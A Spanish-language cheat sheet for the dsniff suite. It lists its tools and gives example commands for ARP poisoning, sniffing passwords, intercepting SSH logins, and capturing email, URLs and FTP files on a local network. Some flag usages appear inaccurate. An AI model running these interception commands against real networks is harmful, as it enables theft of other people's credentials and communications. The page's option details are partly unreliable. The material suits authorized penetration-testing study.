### **Network_Security/Dsniff/dsniff.md**

# dsniff

## Descripción

`dsniff` es un conjunto de herramientas de seguridad de red de código abierto diseñadas para realizar ataques de interceptación y captura de datos en redes locales. Incluye utilidades para envenenamiento ARP, captura de contraseñas, sniffing de tráfico y más, facilitando la ejecución de ataques de hombre en el medio (MITM).

## Uso

```bash
dsniff [opciones]
```

### Herramientas principales dentro de `dsniff`

- `dsniff`: Sniffea contraseñas y datos sensibles a través de protocolos no cifrados.
- `arpspoof`: Realiza envenenamiento ARP para interceptar tráfico.
- `filesnarf`: Copia archivos de tráfico FTP.
- `mailsnarf`: Captura correos electrónicos de tráfico SMTP y POP3.
- `urlsnarf`: Registra URLs visitadas en tráfico HTTP.
- `msgsnarf`: Registra mensajes enviados a través de protocolos instantáneos.
- `webspy`: Intercepta y visualiza tráfico HTTP en tiempo real.
- `sshmitm`: Intercepta conexiones SSH para capturar contraseñas.

### Opciones principales

- `-i interfaz`: Especifica la interfaz de red a utilizar (por ejemplo, `eth0`, `wlan0`).
- `-f`: Fuerza el modo promiscuo.
- `-d`: Ejecuta en modo demonio.
- `-n`: No resuelve nombres de host.
- `-w archivo_log`: Guarda los datos capturados en un archivo de registro.
- `-v`: Modo detallado, muestra información adicional durante la ejecución.

## Ejemplos

- **Iniciar `dsniff` para capturar contraseñas en la interfaz `eth0`:**

  ```bash
  dsniff -i eth0
  ```

- **Realizar un envenenamiento ARP con `arpspoof` dentro de `dsniff`:**

  ```bash
  arpspoof -i wlan0 -t 192.168.1.20 192.168.1.1
  ```

- **Capturar y guardar correos electrónicos con `mailsnarf`:**

  ```bash
  mailsnarf -i eth0 -w correos.log
  ```

- **Registrar URLs visitadas en tráfico HTTP con `urlsnarf`:**

  ```bash
  urlsnarf -i eth0
  ```

- **Interceptar tráfico SSH para capturar contraseñas con `sshmitm`:**

  ```bash
  sshmitm -i eth0
  ```

- **Copiar archivos desde tráfico FTP con `filesnarf`:**

  ```bash
  filesnarf -i wlan0 -w archivos_copiados/
  ```

- **Visualizar tráfico HTTP en tiempo real con `webspy`:**

  ```bash
  webspy -i eth0
  ```

- **Ejecutar `dsniff` en modo detallado:**

  ```bash
  dsniff -i eth0 -v
  ```
